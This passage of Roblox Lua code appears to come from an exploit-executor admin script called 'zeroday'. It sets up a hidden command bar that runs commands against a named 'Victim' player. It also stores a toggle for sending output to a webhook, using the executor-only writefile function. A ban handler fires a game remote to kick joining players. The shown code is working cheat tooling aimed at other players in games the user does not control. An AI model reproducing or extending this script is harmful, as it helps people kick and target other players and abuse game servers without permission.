		textLabel.TextColor3 = Color3.fromRGB(255,255,255)
		textLabel.TextTransparency = .6
		textLabel.BorderSizePixel = 0
		textLabel.TextWrapped = true
		yPos = yPos + 19
	end
end

--[[ UI Handling ]]--
zeroday.Services.UserInputService.InputBegan:Connect(function(key, typing)
	if key.KeyCode == Enum.KeyCode.Quote and not typing then
		Command.Text = ''
		zeroday:toggleBar('show')
		wait() Command:CaptureFocus()
	end
end)

TextButton.MouseButton1Click:Connect(function()
	if shared['toWebhook'] then
		TextButton.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
		shared['toWebhook'] = false
		writefile('brewtw.txt', 'false')
	else
		TextButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
		shared['toWebhook'] = true
		writefile('brewtw.txt', 'true')
	end
end)

Command.FocusLost:Connect(function(forced)
	if forced then
		zeroday:toggleBar('hide')
		local Initial = Command.Text
		zeroday:Debug(Initial)
		if string.split(Initial, ' ')[2] then
			Victim = string.split(Initial, ' ')[2]
			Initial = string.split(Initial, ' ')[1]
			zeroday:Debug(Initial, Victim)
		end
		for index, cmd in zeroday.Commands do
			if Initial:lower() == cmd.name then
				zeroday:Debug(Initial..' '..cmd.name)
				cmd.callback(Victim)
			end 	
		end
		zeroday:Debug(Initial)
		Command.Text = ''
	else
		zeroday:toggleBar('hide')
		Command.Text = ''
	end
end)

--[[ Mobile Support ]]--
if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
	mobileBar.MouseButton1Click:Connect(function()
		Command.Text = ''
		zeroday:toggleBar('show')
		wait() Command:CaptureFocus()
	end)
else
	mobileBar:Destroy()
end

--[[ Ban Handler ]]--
zeroday.Services.Players.PlayerAdded:Connect(function(plr)
	if zeroday.Settings.Serverlock == true then
		zeroday.Remote:FireServer(plr)
	end
	if table.find(zeroday.Bans, plr.Name) then
		zeroday.Remote:FireServer(plr)
		zeroday:Debug("Kicked player: was banned")
	end
end)